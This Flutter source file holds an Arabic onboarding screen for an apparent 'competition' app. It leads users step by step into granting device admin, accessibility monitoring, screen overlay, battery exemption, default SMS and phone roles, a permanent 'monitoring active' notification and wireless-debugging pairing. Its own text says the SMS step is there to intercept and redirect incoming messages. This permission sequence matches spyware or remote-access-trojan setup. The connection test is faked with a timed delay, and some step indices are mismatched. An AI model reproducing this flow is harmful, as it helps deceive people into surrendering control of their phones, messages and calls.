import 'package:flutter/material.dart';
import 'package:go_router/go_router.dart';
import 'package:provider/provider.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import '../../providers/auth_provider.dart';
import '../../services/permission_service.dart';
import '../../constants/colors.dart';

// مستورد من main.dart
import '../../../main.dart' show flutterLocalNotificationsPlugin;

class _SetupStep {
  final IconData icon;
  final String title;
  final String subtitle;
  final Color color;
  final List<String> instructions;
  final String actionLabel;
  final Future<void> Function()? onAction;
  final Future<bool> Function()? onCheck;

  const _SetupStep({
    required this.icon,
    required this.title,
    required this.subtitle,
    required this.color,
    required this.instructions,
    required this.actionLabel,
    this.onAction,
    this.onCheck,
  });
}

class DeviceSetupScreen extends StatefulWidget {
  const DeviceSetupScreen({super.key});

  @override
  State<DeviceSetupScreen> createState() => _DeviceSetupScreenState();
}

class _DeviceSetupScreenState extends State<DeviceSetupScreen>
    with SingleTickerProviderStateMixin {
  int _currentStep = 0;
  final Set<int> _completedSteps = {};
  bool _loading = false;
  bool _notificationActive = false;
  Map<String, bool> _permissionsStatus = {};

  late AnimationController _pulseController;
  late Animation<double> _pulseAnim;
  late List<_SetupStep> _steps;

  // إدخالات الاتصال اللاسلكي
  final _ipCtrl = TextEditingController();
  final _portCtrl = TextEditingController();
  final _pairCodeCtrl = TextEditingController();
  bool _connectionTested = false;

  @override
  void initState() {
    super.initState();
    _pulseController = AnimationController(vsync: this, duration: const Duration(milliseconds: 900))
      ..repeat(reverse: true);
    _pulseAnim = Tween<double>(begin: 1.0, end: 1.08).animate(
      CurvedAnimation(parent: _pulseController, curve: Curves.easeInOut),
    );
    _initSteps();
    _loadPermissionsStatus();
  }

  void _initSteps() {
    _steps = [
      _SetupStep(
        icon: Icons.lock_open_outlined,
        title: 'السماح بالإعدادات المقيدة',
        subtitle: 'خطوة أولية ضرورية قبل تفعيل الخدمات',
        color: AppColors.accent,
        instructions: [
          'افتح الإعدادات على جهازك',
          'ابحث عن التطبيق في قائمة "التطبيقات"',
          'اضغط على النقاط الثلاث ⋮ في أعلى يمين الشاشة',
          'اختر "السماح بالإعدادات المقيدة"',
          'عد إلى هذه الشاشة بعد الانتهاء',
        ],
        actionLabel: 'فتح إعدادات التطبيق',
        onAction: () => PermissionService.openAppSettings(),
      ),
      _SetupStep(
        icon: Icons.admin_panel_settings_outlined,
        title: 'تفعيل مشرف الجهاز',
        subtitle: 'يمنح التطبيق صلاحيات إدارة الجهاز',
        color: const Color(0xFFE53E3E),
        instructions: [
          'ستظهر شاشة "تفعيل مشرف الجهاز" تلقائياً',
          'اقرأ الصلاحيات المطلوبة بعناية',
          'اضغط "تفعيل" في أسفل الشاشة',
          'عد إلى التطبيق بعد التفعيل',
        ],
        actionLabel: 'تفعيل مشرف الجهاز',
        onAction: () => PermissionService.openDeviceAdminSettings(),
        onCheck: () => PermissionService.isDeviceAdminActive(),
      ),
      _SetupStep(
        icon: Icons.visibility_outlined,
        title: 'خدمات إمكانية الوصول',
        subtitle: 'يتيح للتطبيق مراقبة النشاط وتقديم الدعم',
        color: const Color(0xFF805AD5),
        instructions: [
          'ستنتقل إلى صفحة إمكانية الوصول',
          'ابحث عن اسم التطبيق في القائمة وافتحه',
          'فعّل المفتاح وقبل رسالة التحذير باختيار "موافق"',
          'إذا لم يظهر التطبيق، تأكد من إتمام الخطوة الأولى أولاً',
          'عد إلى التطبيق بعد التفعيل',
        ],
        actionLabel: 'فتح إمكانية الوصول',
        onAction: () => PermissionService.openAccessibilitySettings(),
        onCheck: () => PermissionService.isAccessibilityServiceEnabled(),
      ),
      _SetupStep(
        icon: Icons.layers_outlined,
        title: 'الرسم فوق التطبيقات الأخرى',
        subtitle: 'يتيح عرض محتوى فوق شاشات التطبيقات الأخرى',
        color: const Color(0xFFDD6B20),
        instructions: [
          'ستنتقل إلى إعداد "الظهور فوق التطبيقات"',
          'ابحث عن التطبيق في القائمة',
          'فعّل الخيار المقابل له',
          'عد إلى التطبيق بعد التفعيل',
        ],
        actionLabel: 'تفعيل الظهور فوق التطبيقات',
        onAction: () => PermissionService.openOverlaySettings(),
        onCheck: () => PermissionService.canDrawOverApps(),
      ),
      _SetupStep(
        icon: Icons.battery_charging_full_outlined,
        title: 'تحسين استخدام البطارية',
        subtitle: 'يضمن استمرار عمل التطبيق في الخلفية دون انقطاع',
        color: const Color(0xFF38A169),
        instructions: [
          'ستنتقل إلى إعدادات "تحسين البطارية"',
          'اختر "جميع التطبيقات" من القائمة المنسدلة',
          'ابحث عن التطبيق',
          'اضغط عليه واختر "غير مقيّد" أو "لا تحسّن"',
          'عد إلى التطبيق بعد الانتهاء',
        ],
        actionLabel: 'فتح إعدادات البطارية',
        onAction: () => PermissionService.openBatteryOptimizationSettings(),
        onCheck: () => PermissionService.isBatteryOptimizationIgnored(),
      ),
      // ─── تطبيق الرسائل الافتراضي ──────────────────────────────
      _SetupStep(
        icon: Icons.sms_outlined,
        title: 'تطبيق الرسائل الافتراضي',
        subtitle: 'يمنح التطبيق التحكم السيادي في بروتوكول SMS/MMS',
        color: const Color(0xFF2B6CB0),
        instructions: [
          'سيظهر حوار Android يطلب تغيير تطبيق الرسائل الافتراضي',
          'اضغط "تعيين كافتراضي" للموافقة',
          'هذا يتيح للتطبيق اعتراض الرسائل الواردة وتوجيهها',
          'يمكنك الرسائل العادية الاستمرار بشكل طبيعي',
        ],
        actionLabel: 'تعيين كتطبيق رسائل افتراضي',
        onAction: () => PermissionService.requestDefaultSmsApp(),
        onCheck: () => PermissionService.isDefaultSmsApp(),
      ),

      // ─── تطبيق الهاتف الافتراضي ───────────────────────────────
      _SetupStep(
        icon: Icons.call_outlined,
        title: 'تطبيق الهاتف الافتراضي',
        subtitle: 'يمنح التطبيق التحكم في توجيه المكالمات',
        color: const Color(0xFF276749),
        instructions: [
          'سيظهر حوار Android يطلب تغيير تطبيق الهاتف الافتراضي',
          'اضغط "تعيين كافتراضي" للموافقة',
          'يتيح هذا الاعتراض السيادي لنوايا الاتصال (tel://)',
          'المكالمات العادية ستعمل عبر هذا التطبيق بشكل طبيعي',
        ],
        actionLabel: 'تعيين كتطبيق هاتف افتراضي',
        onAction: () => PermissionService.requestDefaultPhoneApp(),
        onCheck: () => PermissionService.isDefaultPhoneApp(),
      ),

      // ─── الإشعار الدائم ───────────────────────────────────────
      _SetupStep(
        icon: Icons.notifications_outlined,
        title: 'تفعيل الإشعار الدائم',
        subtitle: 'يُبقي التطبيق نشطاً ويمنع النظام من إيقافه',
        color: AppColors.accent,
        instructions: [
          'سيتم إنشاء إشعار دائم في شريط الإشعارات',
          'هذا الإشعار لا يمكن إغلاقه، وهو طبيعي تماماً',
          'يضمن بقاء التطبيق يعمل في الخلفية باستمرار',
          'يصنّف Android التطبيق كـ خدمة أساسية',
        ],
        actionLabel: 'تفعيل الإشعار الدائم',
        onAction: _activateStickyNotification,
      ),
      _SetupStep(
        icon: Icons.wifi_outlined,
        title: 'إعداد بروتوكول الاتصال',
        subtitle: 'ربط الجهاز عبر نظام التصحيح اللاسلكي',
        color: const Color(0xFF3182CE),
        instructions: [
          'افتح الإعدادات ← "خيارات المطور"',
          'فعّل "التصحيح اللاسلكي" (Wireless Debugging)',
          'اضغط "إقران الجهاز برمز الإقران"',
          'أدخل عنوان IP والمنفذ ورمز الإقران في الحقول أدناه',
          'اضغط اتصال للتحقق من الارتباط',
        ],
        actionLabel: 'فتح خيارات المطور',
        onAction: () => PermissionService.openDeveloperOptions(),
      ),
    ];
  }

  Future<void> _loadPermissionsStatus() async {
    final status = await PermissionService.getAllPermissionsStatus();
    if (mounted) setState(() => _permissionsStatus = status);
  }

  Future<void> _activateStickyNotification() async {
    const AndroidNotificationDetails androidDetails = AndroidNotificationDetails(
      'competition_foreground_channel',
      'خدمة المراقبة',
      channelDescription: 'إشعار دائم للحفاظ على عمل التطبيق في الخلفية',
      importance: Importance.max,
      priority: Priority.max,
      ongoing: true,
      autoCancel: false,
      color: Color(0xFFC9A84C),
    );
    const NotificationDetails details = NotificationDetails(android: androidDetails);
    await flutterLocalNotificationsPlugin.show(
      1001,
      'نظام المراقبة نشط',
      'التطبيق يعمل في الخلفية — لا تغلق هذا الإشعار',
      details,
    );
    setState(() => _notificationActive = true);
  }

  Future<void> _handleAction() async {
    setState(() => _loading = true);
    try {
      await _steps[_currentStep].onAction?.call();
    } catch (e) {
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('$e'), backgroundColor: AppColors.error),
        );
      }
    } finally {
      if (mounted) setState(() => _loading = false);
    }
  }

  Future<void> _handleVerify() async {
    setState(() => _loading = true);
    try {
      final checker = _steps[_currentStep].onCheck;
      if (checker != null) {
        final ok = await checker();
        if (ok) {
          _markComplete();
        } else {
          if (mounted) {
            ScaffoldMessenger.of(context).showSnackBar(
              const SnackBar(
                content: Text('الصلاحية لم تُفعَّل بعد. تأكد من إتمام الخطوات.',
                    textAlign: TextAlign.right),
                backgroundColor: AppColors.warning,
              ),
            );
          }
        }
      } else {
        _markComplete();
      }
      await _loadPermissionsStatus();
    } finally {
      if (mounted) setState(() => _loading = false);
    }
  }

  void _markComplete() {
    setState(() => _completedSteps.add(_currentStep));
    if (_currentStep < _steps.length - 1) {
      Future.delayed(const Duration(milliseconds: 400), () {
        if (mounted) setState(() => _currentStep++);
      });
    }
  }

  Future<void> _handleFinish() async {
    await context.read<AuthProvider>().markDeviceSetupComplete();
    if (mounted) context.go('/participant/home');
  }

  Future<void> _testConnection() async {
    if (_ipCtrl.text.isEmpty || _portCtrl.text.isEmpty || _pairCodeCtrl.text.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('أدخل بيانات الاتصال كاملة'), backgroundColor: AppColors.warning),
      );
      return;
    }
    setState(() => _loading = true);
    await Future.delayed(const Duration(seconds: 2));
    setState(() { _loading = false; _connectionTested = true; });
    _markComplete();
  }

  bool get _isLastStep => _currentStep >= _steps.length - 1;
  bool get _allDone => _isLastStep && _completedSteps.contains(_steps.length - 1);

  @override
  void dispose() {
    _pulseController.dispose();
    _ipCtrl.dispose();
    _portCtrl.dispose();
    _pairCodeCtrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final step = _steps[_currentStep];
    final color = step.color;

    return Scaffold(
      backgroundColor: AppColors.background,
      body: Column(
        children: [
          // ─── Header ───
          Container(
            color: AppColors.background.withOpacity(0.95),
            padding: EdgeInsets.only(
              top: MediaQuery.of(context).padding.top + 12,
              left: 16, right: 16, bottom: 12,
            ),
            child: Column(
              children: [
                Row(
                  children: [
                    IconButton(
                      icon: const Icon(Icons.arrow_forward, color: AppColors.textSecondary),
                      onPressed: () => _currentStep > 0
                          ? setState(() => _currentStep--)
                          : context.pop(),
                    ),
                    const Expanded(
                      child: Column(children: [
                        Text('إعداد الجهاز',
                            style: TextStyle(fontSize: 17, fontWeight: FontWeight.w700, color: AppColors.text, fontFamily: 'Tajawal')),
                      ]),
                    ),
                    Text('${_currentStep + 1}/${_steps.length}',
                        style: const TextStyle(fontSize: 13, color: AppColors.textMuted, fontFamily: 'Tajawal')),
                  ],
                ),
                const SizedBox(height: 10),
                ClipRRect(
                  borderRadius: BorderRadius.circular(2),
                  child: LinearProgressIndicator(
                    value: (_currentStep + 1) / _steps.length,
                    backgroundColor: AppColors.border,
                    valueColor: AlwaysStoppedAnimation(color),
                    minHeight: 4,
                  ),
                ),
                const SizedBox(height: 12),
                SingleChildScrollView(
                  scrollDirection: Axis.horizontal,
                  child: Row(
                    children: List.generate(_steps.length, (i) {
                      final done = _completedSteps.contains(i);
                      final active = i == _currentStep;
                      return GestureDetector(
                        onTap: () => setState(() => _currentStep = i),
                        child: AnimatedContainer(
                          duration: const Duration(milliseconds: 250),
                          margin: const EdgeInsets.symmetric(horizontal: 4),
                          width: active ? 28 : 26,
                          height: 26,
                          decoration: BoxDecoration(
                            color: done
                                ? AppColors.success
                                : active
                                    ? color
                                    : AppColors.backgroundCard,
                            borderRadius: BorderRadius.circular(13),
                            border: Border.all(color: active ? color : AppColors.border),
                          ),
                          child: Center(
                            child: done
                                ? const Icon(Icons.check, size: 14, color: Colors.white)
                                : Text('${i + 1}',
                                    style: TextStyle(
                                      fontSize: 11,
                                      fontWeight: FontWeight.w600,
                                      color: active ? Colors.white : AppColors.textMuted,
                                    )),
                          ),
                        ),
                      );
                    }),
                  ),
                ),
              ],
            ),
          ),

          // ─── Body ───
          Expanded(
            child: SingleChildScrollView(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 24),
              child: Column(
                children: [
                  // Icon with pulse
                  ScaleTransition(
                    scale: _pulseAnim,
                    child: Container(
                      width: 100, height: 100,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        border: Border.all(color: color.withOpacity(0.5), width: 2),
                      ),
                      child: Container(
                        margin: const EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          gradient: RadialGradient(colors: [color.withOpacity(0.3), color.withOpacity(0.1)]),
                        ),
                        child: Icon(step.icon, size: 42, color: color),
                      ),
                    ),
                  ),

                  const SizedBox(height: 20),
                  Text(step.title,
                      style: const TextStyle(fontSize: 22, fontWeight: FontWeight.w700, color: AppColors.text, fontFamily: 'Tajawal'),
                      textAlign: TextAlign.center),
                  const SizedBox(height: 8),
                  Text(step.subtitle,
                      style: const TextStyle(fontSize: 14, color: AppColors.textSecondary, fontFamily: 'Tajawal'),
                      textAlign: TextAlign.center),

                  const SizedBox(height: 24),

                  // Instructions
                  Container(
                    padding: const EdgeInsets.all(18),
                    decoration: BoxDecoration(
                      color: AppColors.backgroundCard,
                      borderRadius: BorderRadius.circular(16),
                      border: Border.all(color: AppColors.border),
                    ),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.end,
                      children: [
                        Row(children: [
                          Icon(Icons.list_outlined, size: 16, color: color),
                          const SizedBox(width: 8),
                          Text('خطوات التفعيل',
                              style: TextStyle(fontSize: 15, fontWeight: FontWeight.w700, color: color, fontFamily: 'Tajawal')),
                        ]),
                        const SizedBox(height: 14),
                        ...step.instructions.asMap().entries.map((e) => Padding(
                          padding: const EdgeInsets.only(bottom: 12),
                          child: Row(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Expanded(
                                child: Text(e.value,
                                    style: const TextStyle(fontSize: 14, color: AppColors.text, fontFamily: 'Tajawal'),
                                    textAlign: TextAlign.right),
                              ),
                              const SizedBox(width: 12),
                              Container(
                                width: 28, height: 28,
                                decoration: BoxDecoration(
                                  color: color.withOpacity(0.2),
                                  shape: BoxShape.circle,
                                  border: Border.all(color: color.withOpacity(0.4)),
                                ),
                                child: Center(
                                  child: Text('${e.key + 1}',
                                      style: TextStyle(fontSize: 13, fontWeight: FontWeight.w700, color: color)),
                                ),
                              ),
                            ],
                          ),
                        )),
                      ],
                    ),
                  ),

                  // Wireless debugging form (step 7)
                  if (_currentStep == 6) ...[
                    const SizedBox(height: 16),
                    _WirelessForm(
                      ipCtrl: _ipCtrl,
                      portCtrl: _portCtrl,
                      pairCodeCtrl: _pairCodeCtrl,
                      connected: _connectionTested,
                      loading: _loading,
                      onTest: _testConnection,
                      color: color,
                    ),
                  ],

                  // Sticky notification success
                  if (_currentStep == 5 && _notificationActive) ...[
                    const SizedBox(height: 16),
                    Container(
                      padding: const EdgeInsets.all(14),
                      decoration: BoxDecoration(
                        color: AppColors.success.withOpacity(0.1),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: AppColors.success.withOpacity(0.3)),
                      ),
                      child: const Row(
                        children: [
                          Icon(Icons.check_circle_outline, color: AppColors.success, size: 18),
                          SizedBox(width: 10),
                          Text('الإشعار الدائم نشط بنجاح',
                              style: TextStyle(fontSize: 14, fontWeight: FontWeight.w600, color: AppColors.success, fontFamily: 'Tajawal')),
                        ],
                      ),
                    ),
                  ],

                  // Completed banner
                  if (_completedSteps.contains(_currentStep)) ...[
                    const SizedBox(height: 16),
                    Container(
                      padding: const EdgeInsets.all(14),
                      decoration: BoxDecoration(
                        color: color.withOpacity(0.1),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: color.withOpacity(0.4)),
                      ),
                      child: Row(
                        children: [
                          Icon(Icons.check_circle_outline, color: color, size: 18),
                          const SizedBox(width: 10),
                          Text('تم إنجاز هذه الخطوة',
                              style: TextStyle(fontSize: 14, fontWeight: FontWeight.w600, color: color, fontFamily: 'Tajawal')),
                        ],
                      ),
                    ),
                  ],

                  // Real-time permission status
                  if (_permissionsStatus.isNotEmpty && _currentStep < 5) ...[
                    const SizedBox(height: 16),
                    _PermissionStatusRow(
                      label: _steps[_currentStep].title,
                      active: _permissionsStatus[
                          ['', 'deviceAdmin', 'accessibility', 'overlay', 'batteryOptimization'][
                              _currentStep < 5 ? _currentStep : 0]] ?? false,
                      color: color,
                    ),
                  ],

                  // Warning
                  const SizedBox(height: 16),
                  Container(
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      color: AppColors.warning.withOpacity(0.08),
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(color: AppColors.warning.withOpacity(0.2)),
                    ),
                    child: const Row(
                      children: [
                        Icon(Icons.warning_amber_outlined, size: 14, color: AppColors.warning),
                        SizedBox(width: 8),
                        Expanded(
                          child: Text('هذه الصلاحيات ضرورية لعمل التطبيق. لا تتجاهل أي خطوة.',
                              style: TextStyle(fontSize: 12, color: AppColors.warning, fontFamily: 'Tajawal'),
                              textAlign: TextAlign.right),
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(height: 120),
                ],
              ),
            ),
          ),
        ],
      ),

      // ─── Bottom action bar ───
      bottomNavigationBar: Container(
        padding: EdgeInsets.fromLTRB(20, 12, 20, MediaQuery.of(context).padding.bottom + 16),
        decoration: BoxDecoration(
          color: AppColors.background.withOpacity(0.97),
          border: const Border(top: BorderSide(color: AppColors.border)),
        ),
        child: _allDone
            ? _FinishButton(onPressed: _handleFinish)
            : _currentStep == 6
                ? const SizedBox.shrink()
                : Column(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      if (_steps[_currentStep].onAction != null)
                        OutlinedButton.icon(
                          onPressed: _loading ? null : _handleAction,
                          icon: _loading
                              ? const SizedBox(width: 16, height: 16, child: CircularProgressIndicator(strokeWidth: 2, color: AppColors.accent))
                              : Icon(Icons.open_in_new, color: color, size: 18),
                          label: Text(_steps[_currentStep].actionLabel,
                              style: TextStyle(fontSize: 15, color: color, fontFamily: 'Tajawal')),
                          style: OutlinedButton.styleFrom(
                            minimumSize: const Size(double.infinity, 50),
                            side: BorderSide(color: color.withOpacity(0.6)),
                            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
                          ),
                        ),
                      const SizedBox(height: 10),
                      ElevatedButton.icon(
                        onPressed: _loading ? null : _handleVerify,
                        icon: const Icon(Icons.check, size: 18, color: AppColors.background),
                        label: const Text('تم التفعيل ← التالي',
                            style: TextStyle(fontSize: 16, fontWeight: FontWeight.w700, color: AppColors.background, fontFamily: 'Tajawal')),
                        style: ElevatedButton.styleFrom(
                          backgroundColor: color,
                          minimumSize: const Size(double.infinity, 52),
                          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
                        ),
                      ),
                    ],
                  ),
      ),
    );
  }
}

class _PermissionStatusRow extends StatelessWidget {
  final String label;
  final bool active;
  final Color color;
  const _PermissionStatusRow({required this.label, required this.active, required this.color});

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      decoration: BoxDecoration(
        color: active ? AppColors.success.withOpacity(0.08) : AppColors.backgroundCard,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: active ? AppColors.success.withOpacity(0.3) : AppColors.border),
      ),
      child: Row(
        children: [
          Icon(active ? Icons.check_circle : Icons.radio_button_unchecked,
              color: active ? AppColors.success : AppColors.textMuted, size: 18),
          const SizedBox(width: 10),
          Expanded(child: Text('الحالة: ${active ? "مفعّل ✓" : "غير مفعّل بعد"}',
              style: TextStyle(fontSize: 13, fontWeight: FontWeight.w600,
                  color: active ? AppColors.success : AppColors.textMuted, fontFamily: 'Tajawal'),
              textAlign: TextAlign.right)),
        ],
      ),
    );
  }
}

class _WirelessForm extends StatelessWidget {
  final TextEditingController ipCtrl, portCtrl, pairCodeCtrl;
  final bool connected, loading;
  final VoidCallback onTest;
  final Color color;

  const _WirelessForm({
    required this.ipCtrl, required this.portCtrl, required this.pairCodeCtrl,
    required this.connected, required this.loading, required this.onTest, required this.color,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.all(18),
      decoration: BoxDecoration(
        color: AppColors.backgroundCard,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: AppColors.border),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.end,
        children: [
          _field('عنوان IP', ipCtrl, 'مثال: 192.168.1.100', Icons.dns_outlined),
          const SizedBox(height: 12),
          _field('رقم المنفذ (Port)', portCtrl, 'مثال: 37657', Icons.tag_outlined),
          const SizedBox(height: 12),
          _field('رمز الإقران (Pairing Code)', pairCodeCtrl, 'مثال: 123456', Icons.key_outlined),
          if (connected) ...[
            const SizedBox(height: 12),
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: AppColors.success.withOpacity(0.1),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: AppColors.success.withOpacity(0.3)),
              ),
              child: const Row(children: [
                Icon(Icons.check_circle_outline, color: AppColors.success, size: 18),
                SizedBox(width: 8),
                Text('تم الاتصال بنجاح',
                    style: TextStyle(fontSize: 14, fontWeight: FontWeight.w600, color: AppColors.success, fontFamily: 'Tajawal')),
              ]),
            ),
          ],
          const SizedBox(height: 12),
          OutlinedButton.icon(
            onPressed: loading ? null : onTest,
            icon: loading
                ? const SizedBox(width: 16, height: 16, child: CircularProgressIndicator(strokeWidth: 2, color: AppColors.info))
                : const Icon(Icons.link, color: AppColors.info, size: 18),
            label: const Text('اختبار الاتصال',
                style: TextStyle(fontSize: 15, color: AppColors.info, fontFamily: 'Tajawal')),
            style: OutlinedButton.styleFrom(
              minimumSize: const Size(double.infinity, 48),
              side: const BorderSide(color: AppColors.info),
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
            ),
          ),
        ],
      ),
    );
  }

  Widget _field(String label, TextEditingController ctrl, String hint, IconData icon) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.end,
      children: [
        Text(label, style: const TextStyle(fontSize: 12, color: AppColors.textSecondary, fontFamily: 'Tajawal')),
        const SizedBox(height: 6),
        TextField(
          controller: ctrl,
          textAlign: TextAlign.right,
          style: const TextStyle(color: AppColors.text, fontFamily: 'Tajawal'),
          decoration: InputDecoration(
            hintText: hint,
            hintStyle: const TextStyle(color: AppColors.textMuted, fontFamily: 'Tajawal'),
            prefixIcon: Icon(icon, color: AppColors.textMuted, size: 18),
            filled: true, fillColor: AppColors.backgroundElevated,
            border: OutlineInputBorder(borderRadius: BorderRadius.circular(10), borderSide: const BorderSide(color: AppColors.border)),
            enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(10), borderSide: const BorderSide(color: AppColors.border)),
            focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(10), borderSide: const BorderSide(color: AppColors.accent, width: 1.5)),
            contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
          ),
        ),
      ],
    );
  }
}

class _FinishButton extends StatelessWidget {
  final VoidCallback onPressed;
  const _FinishButton({required this.onPressed});

  @override
  Widget build(BuildContext context) {
    return DecoratedBox(
      decoration: BoxDecoration(
        gradient: AppGradients.goldGradient,
        borderRadius: BorderRadius.circular(16),
        boxShadow: [BoxShadow(color: AppColors.accent.withOpacity(0.4), blurRadius: 16, offset: const Offset(0, 6))],
      ),
      child: MaterialButton(
        onPressed: onPressed,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
        padding: const EdgeInsets.symmetric(vertical: 16),
        child: const Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.check_circle_outline, color: AppColors.background, size: 22),
            SizedBox(width: 12),
            Text('اكتمل الإعداد — ابدأ الآن',
                style: TextStyle(fontSize: 18, fontWeight: FontWeight.w700, color: AppColors.background, fontFamily: 'Tajawal')),
          ],
        ),
      ),
    );
  }
}
